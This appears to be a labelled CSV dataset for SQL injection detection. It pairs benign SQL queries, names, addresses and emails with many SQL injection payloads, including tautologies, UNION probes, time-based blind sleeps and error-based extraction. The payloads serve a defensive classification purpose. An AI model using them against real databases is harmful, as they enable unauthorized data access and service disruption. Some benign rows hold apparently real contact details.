Query,Label
"1""  )   as htyo where 8322  =  8322 and 4595  =  4595#",1
"1  )   where 1443  =  1443 union all select null,null,null,null,null#",1
SELECT AVG ( system ) FROM fix SELECT SUM ( dull ) ,0
"-2122""  )   as zytb where 7025  =  7025 or 4747  =  dbms_utility.sqlid_to_sqlhash   (    (   chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113  )  ||  (  select   (  case when   (  4747  =  4747  )   then 1 else 0 end  )   from dual  )  ||chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113   )    )     )  --",1
SELECT AVG ( cannot ) FROM recognize SELECT SUM ( duck ) ,0
SELECT vessels FROM of,0
SELECT * FROM history WHERE NOT complex = 'rise'  AND NOT full = 'greatly',0
SELECT TOP 3 * FROM human WHERE could = 'pretty',0
SELECT fast ( s )  FROM own UNION ALL,0
2055,0
"1  )   as bgvd where 1753  =  1753 and 6510  =    (  select count  (  *  )   from sysusers as sys1,sysusers as sys2,sysusers as sys3,sysusers as sys4,sysusers as sys5,sysusers as sys6,sysusers as sys7  )  --",1
"1'+  (  select ttae where 4601  =  4601 or 2633  =  dbms_pipe.receive_message  (  chr  (  112  )  ||chr  (  65  )  ||chr  (  65  )  ||chr  (  103  )  ,5   )    )   +'",1
admin' or '1'  =  '1,1
"-2125""   )    )    or 8571  =  8571--",1
select   (  case when   (  7271  =  1658  )   then 7271 else 7271*  (  select 7271 from information_schema.character_sets  )   end  )  #,1
57317186j,0
evacuacin,0
wyle@designworld.us,0
"1""   )    )    as hfma where 2654  =  2654 and make_set  (  8403  =  8403,8899  )  --",1
SELECT 18 % 4;,0
"  SELECT Customers.CustomerName, Orders.OrderID FROM Customers LEFT JOIN Orders ON Customers.CustomerID  =  Orders.CustomerID ORDER BY Customers.CustomerName;",0
SELECT look ( s )  FROM service SELECT remember FROM surface,0
"1""   (  select   (  case when   (  4587  =  4587  )   then regexp_substring  (  repeat  (  left  (  crypt_key  (  char  (  65  )  ||char  (  69  )  ||char  (  83  )  ,null  )  ,0  )  ,500000000  )  ,null  )   else char  (  76  )  ||char  (  65  )  ||char  (  102  )  ||char  (  72  )   end  )   from   (  values  (  0   )    )     )  ",1
"1   (  select   (  case when   (  4587  =  4587  )   then regexp_substring  (  repeat  (  left  (  crypt_key  (  char  (  65  )  ||char  (  69  )  ||char  (  83  )  ,null  )  ,0  )  ,500000000  )  ,null  )   else char  (  76  )  ||char  (  65  )  ||char  (  102  )  ||char  (  72  )   end  )   from   (  values  (  0   )    )     )  -- huss",1
SELECT * FROM mice  WHERE problem = onto,0
"1%""   )    )     )   or   (  select 2*  (  if   (    (   select * from   (  select concat  (  0x7171706a71,  (  select   (  elt  (  8113  =  8113,1   )    )     )  ,0x717a767a71,0x78   )    )   s  )  , 8446744073709551610, 8446744073709551610   )    )     )   and    (    (     (  ""%""  =  """,1
SELECT * FROM third WHERE    NOT habit = 'design',0
-6500'   )    )    or   (  8459  =  8459  )  *4906 and    (    (   'padu' like 'padu,1
"  SELECT dirty,enjoy,colony FROM rapidly LEFT JOIN Orders ON fast.runID =  above.hill ORDER BY when.unknown",0
moyes,0
SELECT * FROM troops FETCH FIRST 50 PERCENT ROWS ONLY,0
-2120'  )   or 8734  =  8844#,1
SELECT * FROM substance FETCH FIRST 50 PERCENT ROWS ONLY,0
SELECT * FROM every WHERE mainly = 'thin'  OR story = 'length',0
1'   )    )    rlike   (  select * from   (  select  (  sleep  (  5   )    )     )  sgvo  )   and    (    (   'pemj'  =  'pemj,1
SELECT * FROM though WHERE camera NOT LIKE '[spirit]%',0
1 where 3735  =  3735,1
SELECT joy ( s )  FROM willing FULL OUTER JOIN,0
SELECT MIN ( customs )  AS telephone FROM zipper,0
"  SELECT walk AS throw, needed AS [any]  FROM death",0
-6512'+  (  select 'zdjx' where 5454  =  5454 order by 1--,1
SELECT AVG ( raise )  FROM declared  SELECT SUM ( tongue ) ,0
SELECT TOP 3 * FROM teacher WHERE soap = 'tail' SELECT * FROM facing,0
SELECT * FROM recall WHERE motor = 'officer' FETCH FIRST 3 ROWS ONLY,0
ficker,0
FROM  ( SELECT DISTINCT ocean FROM teacher ) ,0
-8538%' or 5903  =    (  'qqpjq'||  (  select case 5903 when 5903 then 1 else 0 end from rdb$database  )  ||'qzvzq'  )   and '%'  =  ',1
"1"" or 4411  =    (  select count  (  *  )   from sysusers as sys1,sysusers as sys2,sysusers as sys3,sysusers as sys4,sysusers as sys5,sysusers as sys6,sysusers as sys7  )  ",1
" select * from users where id  =  1 or ""  (  @"" or 1  =  1 -- 1",1
"pl. san marcos, 0, 11f",0
"1'  )   as keom where 7524  =  7524 and 2716  =    (  select count  (  *  )   from sysusers as sys1,sysusers as sys2,sysusers as sys3,sysusers as sys4,sysusers as sys5,sysusers as sys6,sysusers as sys7  )  --",1
"-9572%""  )   or 1570  =  convert  (  int,  (  select char  (  113  )  +char  (  113  )  +char  (  112  )  +char  (  106  )  +char  (  113  )  +  (  select   (  case when   (  1570  =  1570  )   then char  (  49  )   else char  (  48  )   end   )    )   +char  (  113  )  +char  (  122  )  +char  (  118  )  +char  (  122  )  +char  (  113   )    )     )   and   (  ""%""  =  """,1
SELECT eventually ( s )  FROM element SELECT drawn ( s ) ,0
"-1763%"" or   (  8459  =  8459  )  *4906 and ""%""  =  """,1
"-8633"" or 5099  =  5974",1
SELECT COUNT ( tinID ) FROM satisfied,0
1'  )   as dqgr where 2427  =  2427 and   (  3020  =  3020  )  *6703--,1
cabot camaran,0
"1  )   as adzj where 5575  =  5575 or 8421  =    (  select count  (  *  )   from generate_series  (  1,5000000   )    )   --",1
"1'  )   or 2367  =    (  select count  (  *  )   from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4  )  --",1
6769,0
SELECT * FROM accident  WHERE chair NOT LIKE '[yes]%',0
" select * from users where id  =  1 or ""%."" or 1  =  1 -- 1",1
"  UPDATE paper SET became =  'grabbed', City =  'anybody' WHERE possible =  climate",0
SELECT * FROM thy,0
hedda,0
SELECT MIN ( short )  AS frame FROM mirror,0
DELETE FROM dust,0
a' or 1  =  1--,1
-7941 or   (  5822  =  8754  )  *8754-- eepn,1
SELECT AVG ( slide )  FROM deeply  SELECT SUM ( central ) ,0
malia,0
"1  )   where 4226  =  4226 or elt  (  5873  =  5873,sleep  (  5   )    )   #",1
SELECT day ( s )  FROM exchange,0
SELECT * FROM report,0
FROM  ( SELECT DISTINCT missing FROM wrapped ) ,0
SELECT metal FROM certain UNION ALL SELECT twenty FROM seat ORDER BY probably,0
"1%""  )   and 8407  =    (  select count  (  *  )   from generate_series  (  1,5000000   )    )    and   (  ""%""  =  """,1
"1   )    )    as jrzr where 5194  =  5194 and char  (  107  )  ||char  (  121  )  ||char  (  97  )  ||char  (  80  )    =  regexp_substring  (  repeat  (  left  (  crypt_key  (  char  (  65  )  ||char  (  69  )  ||char  (  83  )  ,null  )  ,0  )  ,500000000  )  ,null  )  --",1
1n154c3602,0
SELECT DISTINCT dangerous FROM give,0
1' rlike sleep  (  5  )   and 'ojqz' like 'ojqz,1
SELECT improve ( s )  FROM cave,0
"1' where 9003  =  9003 and make_set  (  5868  =  8316,8316  )  --",1
"-3059 or 1570  =  convert  (  int,  (  select char  (  113  )  +char  (  113  )  +char  (  112  )  +char  (  106  )  +char  (  113  )  +  (  select   (  case when   (  1570  =  1570  )   then char  (  49  )   else char  (  48  )   end   )    )   +char  (  113  )  +char  (  122  )  +char  (  118  )  +char  (  122  )  +char  (  113   )    )     )  ",1
SELECT AVG ( involved ) FROM so SELECT SUM ( deer ) ,0
1%'  )   rlike sleep  (  5  )   and   (  '%'  =  ',1
SELECT can FROM rough UNION SELECT speech FROM boy ORDER BY cookies,0
"1"" or 7427  =  dbms_pipe.receive_message  (  chr  (  116  )  ||chr  (  87  )  ||chr  (  90  )  ||chr  (  109  )  ,5  )  --",1
"-3370' in boolean mode  )   union all select 3432,3432,3432,3432#",1
SELECT * FROM  ( SELECT worth FROM foreign ) ,0
" select * from users where id  =  1 or ""$&"" or 1  =  1 -- 1",1
"1%' or row  (  1045,7562  )  >  (  select count  (  *  )  ,concat  (  0x7171706a71,  (  select   (  elt  (  1045  =  1045,1   )    )     )  ,0x717a767a71,floor  (  rand  (  0  )  *2   )    )   x from   (  select 8488 union select 5584 union select 3051 union select 1210  )  a group by x  )   and '%'  =  '",1
"   SELECT suppose, direction, nor FROM game WHERE president  IS NULL",0
"c/ geranio, 65",0
"1"" union all select null,null,null,null,null,null,null,null,null#",1
segura,0
"SELECT * FROM table1 WHERE condition ; INSERT INTO table2  (  column1 , column2 , column3 , ... )  ",0
jovn,0
oestreic,0
"  SELECT milkID AS ID, at AS spin FROM object",0
SELECT * FROM lying WHERE tomorrow  BETWEEN 10 AND 20,0
landau silvestre,0
"   SELECT here,increase,be,ahead,silly     (  (  without JOIN physical ON camp.never =  fog.kept )   INNER JOIN tentON Orders.gray =  union.cageID ) ",0
DELETE FROM angle WHERE vote = 'statement',0
pangborne@europop.mw,0
bota,0
navarra,0
9637,0
1%'   )    )     )   rlike sleep  (  5  )  #,1
"SELECT * FROM smoke WHERE organization BETWEEN ""its"" AND    ""leave""",0
stratten,0
"-3873%'   )    )    or 1 group by concat  (  0x7171706a71,  (  select   (  case when   (  4232  =  4232  )   then 1 else 0 end   )    )   ,0x717a767a71,floor  (  rand  (  0  )  *2   )    )    having min  (  0  )  #",1
 or 0  =  0 --,1
"1  )   where 8338  =  8338 and 6055  =  ctxsys.drithsx.sn  (  6055,  (  chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113  )  ||  (  select   (  case when   (  6055  =  6055  )   then 1 else 0 end  )   from dual  )  ||chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113   )    )     )  --",1
"-4373'+  (  select 'rlht' where 2285  =  2285 union all select 2285,2285,2285#",1
SELECT * FROM ill WHERE another = 'surprise',0
DELETE FROM thou WHERE needs = 'force',0
8.71176E+15,0
entrepalmadura,0
limitable,0
"1'  )   and row  (  6237,7469  )  >  (  select count  (  *  )  ,concat  (  0x7171706a71,  (  select   (  elt  (  6237  =  6237,1   )    )     )  ,0x717a767a71,floor  (  rand  (  0  )  *2   )    )   x from   (  select 5192 union select 3785 union select 3931 union select 7158  )  a group by x  )   and   (  'qbdm'  =  'qbdm",1
SELECT ball ( s FROM being RIGHT JOIN,0
SELECT * FROM wet WHERE recent BETWEEN '1996-07-01' AND '1996-07-31',0
1'||  (  select 'miew' where 8360  =  8360 waitfor delay '0:0:5'  )  ||',1
1' and 6969  =    (  select 6969 from pg_sleep  (  5   )    )    and 'dgvg'  =  'dgvg,1
"1"" and 6637  =  2321",1
DELETE FROM exercise,0
mccowen@esencialser.mn,0
SELECT gave ( s )  FROM sad SELECT hardly ( s ) ,0
1 where 4844  =  4844,1
"1%"" rlike   (  select * from   (  select  (  sleep  (  5   )    )     )  sgvo  )   and ""%""  =  """,1
a2o2e5,0
11800455y,0
"1'   )    )    and char  (  107  )  ||char  (  121  )  ||char  (  97  )  ||char  (  80  )    =  regexp_substring  (  repeat  (  left  (  crypt_key  (  char  (  65  )  ||char  (  69  )  ||char  (  83  )  ,null  )  ,0  )  ,500000000  )  ,null  )  --",1
1' where 1557  =  1557,1
conde,0
-3978 or 4144  =    (  select upper  (  xmltype  (  chr  (  60  )  ||chr  (  58  )  ||chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113  )  ||  (  select   (  case when   (  4144  =  4144  )   then 1 else 0 end  )   from dual  )  ||chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113  )  ||chr  (  62   )    )     )   from dual  )  -- mtun,1
1' where 8159  =  8159 union all select null#,1
gaylord,0
38355013y,0
SELECT * FROM afraid FETCH FIRST 3 ROWS ONLY SELECT TOP 50 PERCENT * FROM corner,0
"1'  )   and extractvalue  (  7982,concat  (  0x5c,0x7171706a71,  (  select   (  elt  (  7982  =  7982,1   )    )     )  ,0x717a767a71   )    )   ",1
teo,0
"   SELECT COUNT ( palace ) , important FROM congress BY pool",0
SELECT * FROM floor WHERE its LIKE '%careful%',0
"  SELECT call,fear FROM gate WHERE get = 'cutting' UNION SELECT terrible, keep FROM underline",0
SELECT COUNT ( plateID ) FROM deer,0
SELECT COUNT ( actually )  FROM brush,0
5953,0
"  SELECT labor,needed FROM asleep WHERE current = 'leather' UNION SELECT growth, ran FROM actual",0
7.73869E+15,0
DELETE FROM class WHERE rubbed = 'sold',0
"SELECT * FROM mother WHERE improve BETWEEN ""greatest"" AND    ""circle""",0
SELECT * FROM clothes WHERE NOT dear = 'deal'  AND NOT adventure = 'table',0
SELECT * FROM read WHERE breathe = 'thus' FETCH FIRST 3 ROWS ONLY,0
holness,0
"SELECT post_id, meta_key, meta_value FROM wp_postmeta WHERE post_id IN  ( 299801 )  ORDER BY meta_id ASC",0
"1  )   where 5234  =  5234 or 8514  =  benchmark  (  5000000,md5  (  0x544d5a4c   )    )   #",1
8e6a74aer,0
millana,0
eial,0
"1""   )    )    and char  (  107  )  ||char  (  121  )  ||char  (  97  )  ||char  (  80  )    =  regexp_substring  (  repeat  (  left  (  crypt_key  (  char  (  65  )  ||char  (  69  )  ||char  (  83  )  ,null  )  ,0  )  ,500000000  )  ,null  )  --",1
SELECT window,0
SELECT TOP 3 * FROM carefully,0
"1'   )    )     )   and 5556  =    (  select count  (  *  )   from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5  )   and    (    (     (  'dhqz'  =  'dhqz",1
boreo@creacionesdolcevita.mo,0
5.25502E+15,0
SELECT * FROM black ORDER BY seven,0
"   SELECT service, simplest, pushFROM possibly WHERE cover  IS NOT NULL",0
SELECT * FROM mean WHERE market LIKE '%explore%',0
"1  )   or 1022  =    (  select count  (  *  )   from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5  )  --",1
SELECT mountain ( s )  FROM shoe SELECT believed ( s ) ,0
"1""  )   and 4595  =  4595#",1
marmolejos,0
SELECT * FROM border 3,0
SELECT * FROM difficult  WHERE question = torn,0
randera,0
"1""   )    )    or updatexml  (  1808,concat  (  0x2e,0x7171706a71,  (  select   (  elt  (  1808  =  1808,1   )    )     )  ,0x717a767a71  )  ,8666  )   and    (    (   ""umst""  =  ""umst",1
"   SELECT Employees.eat, COUNT ( Orders.fairlyID )  AS interiorFROM    ( OrdersINNER JOIN imagine ON Orders.fearID  =  Employees.thingID ) ",0
1084,0
"select like  (  'abcdefg',upper  (  hex  (  randomblob  (  500000000/2   )    )      )    )    and    (    (     (  ""jwzy""  =  ""jwzy",1
"1"" union all select null,null,null,null,null,null,null,null,null--",1
SELECT fort ( s )  FROM main LEFT JOIN,0
"1""  )   where 8878  =  8878 or   (  select 9173 from  (  select count  (  *  )  ,concat  (  0x7171706a71,  (  select   (  elt  (  9173  =  9173,1   )    )     )  ,0x717a767a71,floor  (  rand  (  0  )  *2   )    )   x from information_schema.character_sets group by x  )  a  )  --",1
-3211   )    )    as fsej where 6348  =  6348 or 9805  =  3783--,1
"1   )    )     )   or 4411  =    (  select count  (  *  )   from sysusers as sys1,sysusers as sys2,sysusers as sys3,sysusers as sys4,sysusers as sys5,sysusers as sys6,sysusers as sys7  )   and    (    (     (  9255  =  9255",1
"1   )    )     )   and 3580  =    (  select count  (  *  )   from domain.domains as t1,domain.columns as t2,domain.tables as t3  )  --",1
DELETE FROM yes WHERE sheep = 'porch',0
"1""   )    )    as gprr where 5975  =  5975 and 2388  =  benchmark  (  5000000,md5  (  0x6d457153   )    )   #",1
SELECT AVG ( spent ) FROM vapor,0
ojeda fita,0
"carretera estacion, 144, 8-d",0
"SELECT * FROM announced WHERE lesson BETWEEN ""sometime"" AND    ""habit""",0
" select * from users where id  =  1 or 1#""1 union select 'a',version  (    )   -- 1",1
9.35728E+15,0
san salvador,0
SELECT * FROM real FETCH FIRST 3 ROWS ONLY SELECT TOP 50 PERCENT * FROM traffic,0
"1  )   as clye where 7842  =  7842 and char  (  109  )  ||char  (  79  )  ||char  (  70  )  ||char  (  90  )    =  regexp_substring  (  repeat  (  right  (  char  (  5012  )  ,0  )  ,5000000000  )  ,null  )  --",1
robelo@moviels.me,0
SELECT bill ( s FROM cast RIGHT JOIN,0
SELECT accurate ( s )  FROM huge FULL OUTER JOIN,0
"1%'   )    )    and elt  (  1210  =  1210,sleep  (  5   )    )    and    (    (   '%'  =  '",1
"SELECT post_id, meta_key, meta_value FROM wp_postmeta WHERE post_id IN  ( 191 )  ORDER BY meta_id ASC",0
"calle catedratico eugenio ubeda romero, s/n,",0
SELECT * FROM put WHERE storm = 'silver' LIMIT 3,0
" SELECT * FROM frozen ORDER BY over, former",0
98011650w,0
saetero farrer,0
SELECT * FROM native WHERE wooden = 'bit'  AND  ( wrapped = 'conversation' OR dream = 'shoulder' ) ,0
"1""  )   where 6311  =  6311",1
SELECT FROM_DAYS ( 685467 ) ;,0
"1""  )   where 7513  =  7513 and row  (  6237,7469  )  >  (  select count  (  *  )  ,concat  (  0x7171706a71,  (  select   (  elt  (  6237  =  6237,1   )    )     )  ,0x717a767a71,floor  (  rand  (  0  )  *2   )    )   x from   (  select 5192 union select 3785 union select 3931 union select 7158  )  a group by x  )  --",1
"SELECT * FROM forward WHERE gravity BETWEEN ""highway"" AND    ""happened""",0
20100,0
SELECT outer ( s )  FROM object SELECT waste ( s ) ,0
bendixsen9@foreignoffice.ps,0
1   )    )     )   rlike   (  select * from   (  select  (  sleep  (  5   )    )     )  sgvo  )   and    (    (     (  4574  =  4574,1
"1%'   )    )     )   or char  (  75  )  ||char  (  70  )  ||char  (  99  )  ||char  (  83  )    =  regexp_substring  (  repeat  (  left  (  crypt_key  (  char  (  65  )  ||char  (  69  )  ||char  (  83  )  ,null  )  ,0  )  ,500000000  )  ,null  )  --",1
-6755  )   or 9323  =  9323#,1
"1 and row  (  6237,7469  )  >  (  select count  (  *  )  ,concat  (  0x7171706a71,  (  select   (  elt  (  6237  =  6237,1   )    )     )  ,0x717a767a71,floor  (  rand  (  0  )  *2   )    )   x from   (  select 5192 union select 3785 union select 3931 union select 7158  )  a group by x  )  ",1
SELECT * FROM sitting FETCH FIRST 3 ROWS ONLY SELECT TOP 50 PERCENT * FROM wing,0
"select count  (  *  )   from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3 and    (    (   '%'  =  '",1
"1'  )   as uqkz where 8482  =  8482 and 8407  =    (  select count  (  *  )   from generate_series  (  1,5000000   )    )   --",1
"1%'  )   or 2633  =  dbms_pipe.receive_message  (  chr  (  112  )  ||chr  (  65  )  ||chr  (  65  )  ||chr  (  103  )  ,5  )   and   (  '%'  =  '",1
"1' and 6414  =    (  select count  (  *  )   from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4  )   and 'lwir' like 'lwir",1
SELECT AVG ( locate )  FROM pilot  SELECT SUM ( practice ) ,0
select sleep  (  5  )   and    (    (   'mmvf' like 'mmvf,1
SELECT TOP 50 PERCENT * FROM seldom,0
59137152n,0
"1',  (  cast   (    (   chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113   )    )   ||  (  select 1 from generate_series  (  8979,8979,case when   (  8979  =  8979  )   then 1 else 0 end  )   limit 1  )  ::text||  (  chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113   )    )    as numeric   )    )   ",1
